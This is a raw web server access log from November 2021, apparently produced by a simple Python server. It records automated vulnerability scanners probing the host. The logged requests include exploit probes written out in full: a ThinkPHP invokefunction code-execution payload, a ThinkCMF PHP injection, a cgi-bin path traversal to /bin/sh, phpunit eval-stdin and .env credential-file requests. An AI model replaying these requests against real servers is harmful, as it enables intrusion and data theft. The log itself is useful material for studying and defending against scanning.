119.29.90.49 - - [09/Nov/2021 04:59:36] "[33mGET /member/space/company/info.txt HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:37] "[33mGET /forum.php HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:37] "[33mGET /archiver/ HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:38] "[33mGET /uc_server/control/admin/db.php HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:38] "[33mGET /Help HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:39] "[33mGET /images/branding/logo.gif HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:39] "[33mGET /Install/logo.gif HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:39] "[33mGET /CHANGELOG.txt HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:40] "[33mGET /changelog.txt HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:41] "[33mGET /img/pic/login/top-left.jpg HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:42] "[33mGET /Include/EcsServerApi.js HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:42] "[33mGET /m HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:44] "[33mGET /images/Default_bg_002.gif HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:44] "[33mGET /custom/SkinTemplate/skin/public/images/sys-logo-1caitong-180.jpg HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:45] "[33mGET /eams/static/scripts/grade/course/input.js HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:45] "[33mGET /include/install_ocx.aspx HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:46] "[33mGET /webbuilder/script/locale/wb-lang-zh_CN.js HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:46] "[33mGET /login/Jeecms.do HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:46] "[33mGET /static/images/logo/webserver_small.gif HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:47] "[33mGET /system/Update.aspx HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:47] "[33mGET /Site/Pages/WebResources.ashx/PoweredByKodakImage HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:48] "[33mGET /Site/SystemThemes/7917A0869761B5458281E407AE0090F5/Images/ISBanner58px.jpg HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:48] "[33mGET /nobody/mobile.htm?Login=Captcha HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:49] "[33mGET /admin/admin_login.php?act=login HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:49] "[33mGET /data/images/wap_logo.gif HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:51] "[33mGET /wp-cron.php HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:51] "[33mGET /wp-content HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:53] "[33mGET /wp-login.php HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:53] "[33mGET /license.txt HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:54] "[33mGET /readme.html HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:54] "[33mGET /business/images/index-gg1.jpg HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:54] "[33mGET /logo/logo_jw.png HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:55] "[33mGET /was/help.jsp HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:55] "[33mGET /was5/web/index.jsp HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:56] "[33mGET /was/main.html HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:57] "GET /?c=4e5e5d7364f443e28fbf0d3ae744a59a HTTP/1.1" 200 -
119.29.90.49 - - [09/Nov/2021 04:59:58] "[33mGET /phpmyadmin/ HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:58] "[33mGET /weblog/ HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:58] "[33mGET /blog/ HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:59] "[33mGET /forum/ HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 04:59:59] "[33mGET /bbs/ HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 05:00:00] "[33mGET /wcm/ HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 05:00:00] "[33mGET /admin/editor/ HTTP/1.1[0m" 404 -
119.29.90.49 - - [09/Nov/2021 05:00:01] "[33mGET //favicon.ico HTTP/1.1[0m" 404 -
45.137.23.85 - - [09/Nov/2021 05:04:21] "GET / HTTP/1.1" 200 -
74.82.47.2 - - [09/Nov/2021 05:38:14] "GET / HTTP/1.1" 200 -
183.136.226.4 - - [09/Nov/2021 05:39:35] "GET / HTTP/1.1" 200 -
183.136.226.4 - - [09/Nov/2021 05:39:36] "GET / HTTP/1.1" 200 -
193.118.53.210 - - [09/Nov/2021 05:44:52] "GET / HTTP/1.1" 200 -
45.146.164.110 - - [09/Nov/2021 05:45:44] "[31m[1mPOST /api/jsonws/invoke HTTP/1.1[0m" 405 -
45.146.164.110 - - [09/Nov/2021 05:45:44] "[31m[1mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 405 -
45.146.164.110 - - [09/Nov/2021 05:45:44] "[33mGET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
45.146.164.110 - - [09/Nov/2021 05:45:44] "[33mGET /solr/admin/info/system?wt=json HTTP/1.1[0m" 404 -
45.146.164.110 - - [09/Nov/2021 05:45:44] "[33mGET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1[0m" 404 -
45.146.164.110 - - [09/Nov/2021 05:45:44] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 -
45.146.164.110 - - [09/Nov/2021 05:45:44] "[33mGET /wp-content/plugins/wp-file-manager/readme.txt HTTP/1.1[0m" 404 -
45.146.164.110 - - [09/Nov/2021 05:45:44] "[33mGET /console/ HTTP/1.1[0m" 404 -
45.146.164.110 - - [09/Nov/2021 05:45:45] "[31m[1mPOST /Autodiscover/Autodiscover.xml HTTP/1.1[0m" 405 -
45.146.164.110 - - [09/Nov/2021 05:45:45] "[33mGET /_ignition/execute-solution HTTP/1.1[0m" 404 -
45.146.164.110 - - [09/Nov/2021 05:45:45] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 -
45.146.164.110 - - [09/Nov/2021 05:45:45] "GET / HTTP/1.1" 200 -
45.146.164.110 - - [09/Nov/2021 05:45:45] "[31m[1mPOST /cgi-bin/../../../../bin/sh HTTP/1.1[0m" 405 -
45.146.164.110 - - [09/Nov/2021 05:45:45] "GET / HTTP/1.1" 200 -
159.203.18.202 - - [09/Nov/2021 06:08:54] "[33mGET /.env HTTP/1.1[0m" 404 -
159.203.18.202 - - [09/Nov/2021 06:08:55] "[31m[1mPOST / HTTP/1.1[0m" 405 -
87.251.64.141 - - [09/Nov/2021 06:13:06] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
87.251.64.141 - - [09/Nov/2021 06:13:06] "[35m[1m  /*à     Cookie: mstshash=Administr[0m" HTTPStatus.BAD_REQUEST -
119.102.74.236 - - [09/Nov/2021 06:16:30] "[31m[1mPOST /GponForm/diag_Form?images/ HTTP/1.1[0m" 405 -
